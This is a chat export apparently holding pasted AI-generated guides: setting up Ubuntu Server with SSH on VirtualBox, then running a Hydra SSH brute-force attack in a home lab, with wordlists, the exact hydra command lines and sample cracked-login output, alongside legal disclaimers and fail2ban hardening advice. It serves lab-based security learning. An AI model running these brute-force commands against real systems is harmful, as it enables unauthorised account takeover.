[29/05, 9:26 pm] Aashik: Here's a step-by-step guide to install a Linux server (like Ubuntu Server) on VirtualBox and then install and enable SSH access.


---

✅ Step 1: Download Required Software

1. Download VirtualBox:

Go to https://www.virtualbox.org

Download and install the latest version for your OS.



2. Download Ubuntu Server ISO:

Visit https://ubuntu.com/download/server

Download the .iso file (e.g., Ubuntu Server 22.04 LTS).





---

✅ Step 2: Create a Virtual Machine

1. Open VirtualBox and click on "New".


2. Name: Ubuntu-Server, Type: Linux, Version: Ubuntu (64-bit).


3. Allocate memory: 2048 MB (or more if available).


4. Create a virtual hard disk:

Choose VDI (VirtualBox Disk Image)

Dynamically allocated

Size: at least 10 GB





---

✅ Step 3: Mount ISO and Start Installation

1. Start the VM → It will prompt to select a startup disk.


2. Browse and select the Ubuntu Server ISO file.


3. Follow the installation steps:

Language, keyboard, and region settings.

Configure network (DHCP works fine for now).

Set up user account and password.

Configure storage → use entire disk.

Wait for installation to finish and reboot.




> 💡 When prompted to "Remove installation medium", go to Devices > Optical Drives > Remove disk from virtual drive in VirtualBox before rebooting.




---

✅ Step 4: Log in to Ubuntu Server

Use the credentials you created during installation.


---

✅ Step 5: Install SSH Server

Run the following commands in the terminal:

sudo apt update
sudo apt install openssh-server

Check SSH service status:

sudo systemctl status ssh

If it's not running, start it:

sudo systemctl start ssh

Enable it to run on boot:

sudo systemctl enable ssh


---

✅ Step 6: Find Your VM's IP Address

Run:

ip a

Look for an IP address under eth0 or enp0s3, like 192.168.x.x.


---

✅ Step 7: SSH into Your VM (from Host Machine)

On your host machine (e.g., Windows, Mac), open a terminal or SSH client like PuTTY:

ssh username@192.168.x.x

Replace username with your actual Linux username and IP with your VM’s address.

> 🔒 If you're not able to connect, check VirtualBox network settings. Bridged Adapter or NAT with Port Forwarding should be configured for external SSH access.




---

Let me know if you want help setting up port forwarding, bridged networking, or choosing a different Linux distribution (like CentOS, Debian, etc.).
[29/05, 9:32 pm] Aashik: Launching a brute-force attack on Kali Linux using Hydra is possible only if you've configured a service (like SSH) on Kali to accept login attempts.

Since Kali is usually an attacker machine, by default SSH is disabled. So first, we’ll set up SSH on Kali, then simulate a brute-force attack from another machine (like Ubuntu Server or a second Kali instance).


---

⚙️ Step 1: Enable SSH on Kali Linux (Target Machine)

Open terminal on the target Kali VM and run:

sudo apt update
sudo apt install openssh-server -y
sudo systemctl enable ssh
sudo systemctl start ssh

Check if SSH is running:

sudo systemctl status ssh

Find the Kali IP:

ip a

Take note of your IP, e.g., 192.168.1.101.


---

🧪 Step 2: Create a User (Optional)

If you don’t want to attack root, create a new test user:

sudo adduser testuser

Set a weak password to simulate vulnerability (e.g., 1234).


---

🧰 Step 3: Prepare Wordlists on Attacker Machine

Let’s assume you're using another VM (Ubuntu or Kali) as the attacker.

Create simple username and password lists:

echo "testuser" > userlist.txt
echo -e "1234\npassword\nadmin" > passlist.txt


---

💥 Step 4: Launch Hydra Brute-Force Attack

Run the following command from the attacker VM:

hydra -L userlist.txt -P passlist.txt ssh://<KALI-IP>

Example:

hydra -L userlist.txt -P passlist.txt ssh://192.168.1.101


---

🧾 Example Output (Success)

[22][ssh] host: 192.168.1.101 login: testuser password: 1234


---

🛡️ Step 5: Secure Your Kali (After Testing)

Once testing is done:

Disable SSH if not needed:

sudo systemctl stop ssh
sudo systemctl disable ssh

Or install fail2ban for protection.



---

⚠️ Legal Reminder

Only perform this on systems you own or have explicit permission to test. Unauthorized brute-force attacks are illegal and against ethical hacking standards.


---

Would you like to:

Automate this attack with a bash script?

Run Hydra against another service (e.g., FTP, HTTP login)?

Simulate detection with fail2ban or log review?
[29/05, 10:47 pm] Aashik: ⚠️ Important Disclaimer:
Brute-force attacks, even in a lab environment, must be conducted ethically, legally, and only on systems you own or have explicit permission to test. Performing unauthorized brute-force attacks is illegal and a violation of cybersecurity laws.


---

🎯 Objective:

Simulate a brute-force attack on SSH using Hydra in a controlled virtual lab setup (e.g., Kali Linux attacking an Ubuntu Server on VirtualBox).


---

🧰 Requirements:

Target VM: Ubuntu Server with SSH installed (already done).

Attacker VM: Kali Linux with Hydra installed (preinstalled in Kali).



---

✅ Step-by-Step Guide

1. Set Up the Environment

Ensure:

Both VMs (Kali and Ubuntu Server) are on the same virtual network (e.g., internal network or bridged).

You know the IP address of the Ubuntu server:

ip a



---

2. Create a Wordlist (if needed)

Kali Linux comes with some default wordlists (e.g., /usr/share/wordlists/rockyou.txt.gz). You can also make your own:

echo -e "admin\npassword\n123456\nubuntu\nroot" > passlist.txt
echo -e "user\nubuntu\nadmin" > userlist.txt


---

3. Run Hydra Brute-Force Attack

hydra -L userlist.txt -P passlist.txt ssh://<TARGET-IP>

🔍 Example:

hydra -L userlist.txt -P passlist.txt ssh://192.168.1.100

> -L: File containing list of usernames
-P: File containing list of passwords
ssh://: Target protocol and IP




---

4. Interpreting the Output

If successful, Hydra will show:

[22][ssh] host: 192.168.1.100 login: ubuntu password: 123456


---

🛑 Security Note:

After testing, you should:

Disable root SSH access.

Use SSH key-based authentication.

Install fail2ban to prevent brute-force attacks.


sudo apt install fail2ban


---

🧪 Optional: Use Metasploitable2 Instead of Ubuntu

If you want a more vulnerable target for testing, try using Metasploitable2 as the target VM.
